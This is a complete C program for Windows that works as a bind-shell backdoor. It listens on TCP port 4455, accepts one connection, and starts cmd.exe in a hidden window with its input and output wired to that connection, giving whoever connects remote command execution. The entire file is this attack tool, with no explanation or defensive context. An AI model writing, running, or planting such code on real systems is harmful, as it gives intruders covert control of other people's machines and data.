#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define DEFAULT_PORT 4455
#define BUFSIZE 512

int main()
{
	SOCKET sock,clientfd;
	WSADATA wsaData;
	struct sockaddr_in server;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	char buf[BUFSIZE];
	int bytesWritten;

	ZeroMemory(&wsaData,sizeof(wsaData));
	WSAStartup(0x0202,&wsaData);

	if((sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0)) == 0) {
		fprintf(stderr, "Sorry cannot create socket\n");
		return -1;
	}

	ZeroMemory(&server,sizeof(server));
	server.sin_family = AF_INET;
	server.sin_port = htons(DEFAULT_PORT);
	server.sin_addr.s_addr = htonl(INADDR_ANY);

	if(bind(sock,(struct sockaddr*)&server,sizeof(server)) < 0) {
		fprintf(stderr,"Sorry couldn't bind server info to socket.\n");
		goto error;
	}

	if(listen(sock,1) < 0) {
		fprintf(stderr,"Error: listening for connection.\n");
		goto error;
	}

	if((clientfd = accept(sock,(struct sockaddr*)NULL,NULL)) < 0) {
		fprintf(stderr,"Error: couldn't accept connection from client.\n");
		goto error;
	}

	ZeroMemory(&si,sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)clientfd;
	si.hStdOutput = (HANDLE)clientfd;
	si.hStdError = (HANDLE)clientfd;

	if(CreateProcess(NULL,"C:\\Windows\\System32\\cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi) != 0) {
		printf("Create process...\n");
	}

	if(pi.hProcess) {
		WaitForSingleObject(pi.hProcess,INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	closesocket(sock);
	WSACleanup();
	return 0;

error:
	if(sock != 0) closesocket(sock);
	WSACleanup();
	return 1;
}
